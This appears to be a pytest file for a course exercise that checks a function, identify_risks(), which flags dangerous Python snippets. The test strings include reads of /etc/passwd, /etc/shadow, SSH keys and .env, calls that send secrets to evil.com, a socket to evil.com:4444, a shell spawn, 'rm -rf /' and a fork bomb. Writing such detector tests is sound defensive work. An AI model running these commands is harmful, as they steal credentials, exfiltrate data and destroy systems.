"""Tests for Chapter 1 challenge: identify_risks()"""

import pytest
from ch01 import identify_risks


class TestFilesystemRisks:
    def test_reads_etc_passwd(self):
        code = "open('/etc/passwd').read()"
        risks = identify_risks(code)
        assert any("filesystem" in r.lower() for r in risks)

    def test_reads_ssh_key(self):
        code = "open(os.path.expanduser('~/.ssh/id_rsa')).read()"
        risks = identify_risks(code)
        assert any("filesystem" in r.lower() for r in risks)

    def test_os_walk_root(self):
        code = "import os\nfor root, dirs, files in os.walk('/'):\n    pass"
        risks = identify_risks(code)
        assert any("filesystem" in r.lower() for r in risks)

    def test_reads_env_file(self):
        code = "data = open('.env').read()"
        risks = identify_risks(code)
        assert any("filesystem" in r.lower() for r in risks)


class TestNetworkRisks:
    def test_urllib_request(self):
        code = "import urllib.request\nurllib.request.urlopen('https://evil.com/exfil')"
        risks = identify_risks(code)
        assert any("network" in r.lower() for r in risks)

    def test_socket_connect(self):
        code = "import socket\ns = socket.socket()\ns.connect(('evil.com', 4444))"
        risks = identify_risks(code)
        assert any("network" in r.lower() for r in risks)

    def test_requests_post(self):
        code = "import requests\nrequests.post('https://evil.com', data=secrets)"
        risks = identify_risks(code)
        assert any("network" in r.lower() for r in risks)


class TestSubprocessRisks:
    def test_subprocess_shell(self):
        code = "import subprocess\nsubprocess.call('/bin/sh', shell=True)"
        risks = identify_risks(code)
        assert any("subprocess" in r.lower() for r in risks)

    def test_os_system(self):
        code = "import os\nos.system('rm -rf /')"
        risks = identify_risks(code)
        assert any("subprocess" in r.lower() for r in risks)

    def test_os_popen(self):
        code = "import os\nos.popen('cat /etc/shadow')"
        risks = identify_risks(code)
        assert any("subprocess" in r.lower() for r in risks)


class TestResourceRisks:
    def test_fork_bomb(self):
        code = "import os\nwhile True:\n    os.fork()"
        risks = identify_risks(code)
        assert any("resource" in r.lower() for r in risks)

    def test_infinite_allocation(self):
        code = "data = []\nwhile True:\n    data.append('x' * 10**6)"
        risks = identify_risks(code)
        assert any("resource" in r.lower() for r in risks)


class TestSafeCode:
    def test_simple_math(self):
        code = "x = 1 + 2\nprint(x)"
        risks = identify_risks(code)
        assert risks == []

    def test_list_comprehension(self):
        code = "squares = [x**2 for x in range(10)]"
        risks = identify_risks(code)
        assert risks == []
